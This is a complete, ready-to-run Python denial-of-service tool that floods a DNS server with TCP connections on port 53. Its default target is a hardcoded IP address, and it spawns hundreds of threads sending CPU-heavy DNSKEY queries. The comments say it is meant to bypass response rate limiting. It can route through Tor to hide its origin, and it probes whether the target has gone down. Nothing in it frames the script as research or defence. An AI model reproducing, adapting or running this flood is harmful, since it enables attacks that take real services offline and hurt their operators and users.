#!/usr/bin/env python3
"""
DNS TCP flood — exhausts TCP connection table on port 53.
DNS-over-TCP uses 2-byte length prefix before the query.
No RRL applies to TCP connections.

Usage:
  python3 dns_tcp_flood.py
  python3 dns_tcp_flood.py --workers 500
"""

import socket, struct, threading, time, random, argparse
from datetime import datetime

try:
    import socks as pysocks
    PYSOCKS_OK = True
except ImportError:
    PYSOCKS_OK = False

G = "\033[0;32m"; R = "\033[0;31m"; Y = "\033[0;33m"
B = "\033[1m"; W = "\033[0m"


def build_query(domain, qtype):
    tx_id = random.randint(0, 65535)
    flags = 0x0100
    header = struct.pack(">HHHHHH", tx_id, flags, 1, 0, 0, 0)
    labels = b""
    for part in domain.encode().split(b"."):
        labels += bytes([len(part)]) + part
    labels += b"\x00"
    msg = header + labels + struct.pack(">HH", qtype, 1)
    return struct.pack(">H", len(msg)) + msg


FLOOD_DOMAIN = "verisign.com"
FLOOD_QTYPE  = 48

stats_lock = threading.Lock()
sent       = 0
errors     = 0
stop       = threading.Event()


def _make_socket(use_tor):
    if use_tor:
        if not PYSOCKS_OK:
            raise RuntimeError("pip3 install pysocks")
        s = pysocks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
        s.set_proxy(pysocks.SOCKS5, "127.0.0.1", 9050)
    else:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    return s


def flood_worker(target, port, use_tor):
    global sent, errors
    pkt = build_query(FLOOD_DOMAIN, FLOOD_QTYPE)
    while not stop.is_set():
        try:
            s = _make_socket(use_tor)
            s.settimeout(10)
            s.connect((target, port))
            s.sendall(pkt)
            s.recv(512)
            s.close()
            with stats_lock:
                sent += 1
        except Exception:
            with stats_lock:
                errors += 1


def probe(target, port, use_tor, timeout=3.0):
    pkt = build_query("metoo-shatkin.com", 1)
    t0 = time.time()
    try:
        s = _make_socket(use_tor)
        s.settimeout(timeout)
        s.connect((target, port))
        s.sendall(pkt)
        s.recv(512)
        ms = (time.time() - t0) * 1000
        s.close()
        return True, ms
    except socket.timeout:
        return False, timeout * 1000
    except Exception:
        return False, (time.time() - t0) * 1000


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--target",         default="104.236.68.226")
    p.add_argument("--port",           type=int, default=53)
    p.add_argument("--workers",        type=int, default=300)
    p.add_argument("--check-interval", type=float, default=5.0)
    p.add_argument("--tor",            action="store_true",
                   help="Route via Tor SOCKS5 (127.0.0.1:9050)")
    args = p.parse_args()

    proxy_label = "Tor SOCKS5" if args.tor else "direct"
    print(f"""
{B}{'='*62}{W}
  DNS TCP Flood — port 53 TCP connection exhaustion
{B}{'='*62}{W}
  Target  : {args.target}:{args.port}
  Workers : {args.workers} concurrent TCP connections
  Query   : DNSKEY {FLOOD_DOMAIN} (15.1x amp, max CPU)
  Proxy   : {proxy_label}
  No RRL  : TCP connections bypass UDP rate limiting
{B}{'='*62}{W}
""")

    for _ in range(args.workers):
        threading.Thread(
            target=flood_worker,
            args=(args.target, args.port, args.tor),
            daemon=True
        ).start()

    prev_sent = 0
    try:
        while True:
            time.sleep(args.check_interval)
            with stats_lock:
                cur_sent   = sent
                cur_errors = errors

            rps = (cur_sent - prev_sent) / args.check_interval
            prev_sent = cur_sent

            ok, ms = probe(args.target, args.port, args.tor)
            ts = datetime.now().strftime("%H:%M:%S")

            probe_str = f"{G}UP {ms:.0f}ms{W}" if ok else f"{R}DOWN {ms:.0f}ms{W}"
            print(f"  {ts} | sent={cur_sent:>6} | rps={rps:>5.0f} | err={cur_errors:>4} | probe={probe_str}")

    except KeyboardInterrupt:
        print(f"\n  {Y}[STOPPED]{W} Ctrl+C\n")
        stop.set()


if __name__ == "__main__":
    main()
